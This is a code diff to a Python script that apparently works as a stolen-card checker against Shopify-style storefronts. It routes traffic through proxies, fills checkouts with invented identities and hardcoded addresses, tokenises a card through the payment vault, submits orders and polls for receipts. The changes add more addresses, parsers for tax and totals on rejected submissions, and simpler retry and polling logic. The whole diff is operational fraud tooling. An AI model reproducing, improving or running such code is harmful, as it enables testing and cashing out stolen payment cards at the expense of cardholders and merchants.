@@ -45,7 +45,6 @@ def _load_products():
                     except ValueError:
                         price_val = 0.0
                     
-                    # Filter out items < $1.00
                     if price_val < 1.00:
                         continue
 
@@ -117,6 +116,10 @@ ADDRESSES = [
     {"street":"100 W 10th St",            "city":"Wilmington","state":"DE","zip":"19801","phone":"+13025550100"},
     {"street":"500 5th Ave",              "city":"New York",  "state":"NY","zip":"10110","phone":"+12125550100"},
     {"street":"200 W Madison St",         "city":"Chicago",   "state":"IL","zip":"60606","phone":"+13125550100"},
+    {"street":"600 Congress Ave",         "city":"Austin",    "state":"TX","zip":"78701","phone":"+15125550100"},
+    {"street":"1 Market St",              "city":"San Francisco","state":"CA","zip":"94105","phone":"+14155550100"},
+    {"street":"300 S Biscayne Blvd",      "city":"Miami",     "state":"FL","zip":"33131","phone":"+13055550100"},
+    {"street":"100 Peachtree St",         "city":"Atlanta",   "state":"GA","zip":"30303","phone":"+14045550100"},
 ]
 
 def _identity():
@@ -214,8 +217,34 @@ def _tax_amount(b):
         d = json.loads(b)
         sp = (d.get("data",{}).get("session",{}).get("negotiate",{})
                .get("result",{}).get("sellerProposal",{}))
+        
+        # Look for V2 first (DevTools response), then fallback
+        v2 = sp.get("tax",{}).get("totalTaxAmountV2",{}).get("amount")
+        if v2: return v2
+        
         return sp.get("tax",{}).get("totalTaxAmount",{}).get("value",{}).get("amount","0.0")
     except Exception: return "0.0"
+
+def _tax_from_rejected(b):
+    try:
+        d = json.loads(b)
+        sp = d.get("data",{}).get("submitForCompletion",{}).get("sellerProposal",{})
+        v2 = sp.get("tax",{}).get("totalTaxAmountV2",{}).get("amount")
+        if v2: return v2
+        return sp.get("tax",{}).get("totalTaxAmount",{}).get("value",{}).get("amount","0.0")
+    except Exception: return "0.0"
+
+def _total_from_rejected(b):
+    try:
+        d = json.loads(b)
+        sp = d.get("data",{}).get("submitForCompletion",{}).get("sellerProposal",{})
+        v = sp.get("checkoutTotal",{}).get("amount")
+        if v: return v
+        for k in ("total","runningTotal"):
+            v = sp.get(k,{}).get("value",{}).get("amount")
+            if v: return v
+    except Exception: pass
+    return ""
 
 def _is_shipping_required(b):
     try:
@@ -526,11 +555,12 @@ def _run_check(card_str, proxy_str):
     if proxy_url: session.proxies = {"http": proxy_url, "https": proxy_url}
 
     try:
+        # ═══ Step 1: Cart ═══
         try:
             r = session.get(f"{shop_url}/cart/{vid}:1", headers={"user-agent": ua},
                             allow_redirects=True, timeout=t_max(4))
         except Exception as e:
-            return _resp(f"CART_FAILED_{str(e)[:10]}", price=f"{price} USD")
+            return _resp("CART_FAILED", price=f"{price} USD")
         
         if r.status_code != 200:
             return _resp("CART_FAILED", price=f"{price} USD")
@@ -578,6 +608,7 @@ def _run_check(card_str, proxy_str):
         
         use_lines = False
 
+        # ═══ Step 2: Proposal 1 (Empty) ═══
         try:
             p = _proposal_payload(session_token, stable_id, vid, amount, currency, None, None, prop_id, use_lines)
             r1 = session.post(prop_url, headers=hdr, json=p, timeout=t_max(4))
@@ -596,6 +627,7 @@ def _run_check(card_str, proxy_str):
         if not queue_token:
             return _fail("P1_NO_QUEUE", shop=shop_url, body=r1.text[:800])
 
+        # ═══ Step 3: Proposal 2 (Email) ═══
         try:
             p = _proposal_payload(session_token, stable_id, vid, amount, currency, email, None, prop_id, use_lines)
             p["variables"]["queueToken"] = queue_token
@@ -605,6 +637,7 @@ def _run_check(card_str, proxy_str):
         if r2.status_code != 200:
             return _fail("P2_HTTP", shop=shop_url, status=r2.status_code, body=r2.text[:800])
 
+        # ═══ Step 4: Proposal 3 (Address) ═══
         pm_id = ""
         del_h = ""
         signed = []
@@ -613,41 +646,36 @@ def _run_check(card_str, proxy_str):
         shipping_required = True
         r3_text = ""
 
-        for addr_attempt in range(2):
-            try:
-                p = _proposal_payload(session_token, stable_id, vid, amount, currency, email, addr, prop_id, use_lines)
-                p["variables"]["queueToken"] = queue_token
-                r3 = session.post(prop_url, headers=hdr, json=p, timeout=t_max(4))
+        try:
+            p = _proposal_payload(session_token, stable_id, vid, amount, currency, email, addr, prop_id, use_lines)
+            p["variables"]["queueToken"] = queue_token
+            r3 = session.post(prop_url, headers=hdr, json=p, timeout=t_max(4))
+            
+            if r3.status_code == 200:
+                r3_text = r3.text
+                if "SHIPPING_ADDRESS_UNDELIVERABLE" in r3_text or "no_delivery_options" in r3_text:
+                    return _resp("SHIPPING_FAILED", price=f"{amount} {currency}")
                 
-                if r3.status_code == 200:
-                    r3_text = r3.text
-                    if "SHIPPING_ADDRESS_UNDELIVERABLE" in r3_text or "no_delivery_options" in r3_text:
-                        raise Exception("Shipping undeliverable")
-                    
-                    pm_id  = _payment_method_id(r3_text)
-                    del_h  = _delivery_handle(r3_text)
-                    signed = _signed_handles(r3_text)
-                    tax    = _tax_amount(r3_text)
-                    amount_f = _checkout_total(r3_text) or amount
-                    queue_token = _queue_token(r3_text) or queue_token
-                    shipping_required = _is_shipping_required(r3_text)
-                    
-                    if pm_id and (signed or not shipping_required) and (del_h or not shipping_required):
-                        break
-            except Exception:
-                pass
-                
-            time.sleep(0.1)
-            fn, ln, email, addr_raw = _identity()
-            addr = {"fn":fn,"ln":ln,"street":addr_raw["street"],"city":addr_raw["city"],
-                    "state":addr_raw["state"],"zip":addr_raw["zip"],"phone":addr_raw["phone"]}
+                pm_id  = _payment_method_id(r3_text) or _payment_method_id(r2.text) or _payment_method_id(r1.text)
+                del_h  = _delivery_handle(r3_text)
+                signed = _signed_handles(r3_text)
+                tax    = _tax_amount(r3_text)
+                amount_f = _checkout_total(r3_text) or amount
+                queue_token = _queue_token(r3_text) or queue_token
+                shipping_required = _is_shipping_required(r3_text)
+        except Exception:
+            return _resp("SHIPPING_FAILED", price=f"{amount} {currency}")
 
         if not pm_id:
             pm_id = _payment_method_id_from_html(checkout_html)
 
-        if not pm_id or (shipping_required and not del_h):
+        if not pm_id:
             return _resp("SHIPPING_FAILED", price=f"{amount_f} {currency}")
 
+        if shipping_required and (not del_h or not signed):
+            return _resp("SHIPPING_FAILED", price=f"{amount_f} {currency}")
+
+        # ═══ Step 5: PCI ═══
         ident_sig = _ident_sig(checkout_html)
         v_url     = _vault_url(checkout_html)
         v_dom     = _vault_domain(checkout_html)
@@ -658,6 +686,7 @@ def _run_check(card_str, proxy_str):
         if not sid: 
             return _resp("PCI_FAILED", price=f"{amount_f} {currency}")
 
+        # ═══ Step 6: Submit ═══
         sa        = _street_addr(fn, ln, addr_raw)
         price_str = f"{amount_f} {currency}"
         merch_key = "lines" if use_lines else "merchandiseLines"
@@ -722,7 +751,7 @@ def _run_check(card_str, proxy_str):
                                 "sellingPlanDigest": None,
                             }},
                             "quantity":             {"items": {"value": 1}},
-                            "expectedTotalPrice":   {"value": {"amount": cur_total, "currencyCode": currency}}, # EXACT
+                            "expectedTotalPrice":   {"value": {"amount": cur_total, "currencyCode": currency}},
                             "lineComponentsSource": None,
                             "lineComponents":       [],
                         }]},
@@ -835,7 +864,7 @@ def _run_check(card_str, proxy_str):
             rid = _receipt_id(body)
             rss = _receipt_session(body)
             if rid and rss and remain() > 4:
-                for _ in range(10):
+                for _ in range(15):
                     if remain() < 2: break
                     time.sleep(0.5)
                     try:
